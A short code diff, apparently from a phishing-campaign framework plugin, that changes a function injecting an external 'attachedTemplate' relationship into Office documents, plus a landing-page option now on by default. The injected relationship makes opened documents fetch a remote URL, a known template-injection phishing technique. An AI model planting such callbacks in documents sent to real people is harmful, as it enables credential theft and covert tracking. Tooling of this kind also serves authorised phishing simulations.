@@ -23,10 +23,10 @@ def path_is_doc_file(path):
 		return False
 	return True
 
-def phishery_inject(input_file, https_url, output_file=None):
+def phishery_inject(input_file, document_urls, output_file=None):
 	target_string = '<Relationship Id="{rid}" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="{target_url}" TargetMode="External"/>'
 	input_file = os.path.abspath(input_file)
-	document_urls = https_url.split()
+	document_urls = document_urls.split()
 	rids = []
 	while len(rids) < len(document_urls):
 		rid = 'rId' + str(random.randint(10000, 99999))
@@ -90,9 +90,9 @@ class Plugin(getattr(plugins, 'ClientPluginMailerAttachment', plugins.ClientPlug
 		),
 		plugins.ClientOptionBoolean(
 			'add_landing_pages',
-			'Add all document URLs as landing pages to track visits',
-			default=False,
-			display_name='Add document URLs as landing pages.'
+			'Add all document URLs as landing pages to track visits.',
+			default=True,
+			display_name='Add Landing Pages'
 		)
 	]
 	req_min_version = min_version
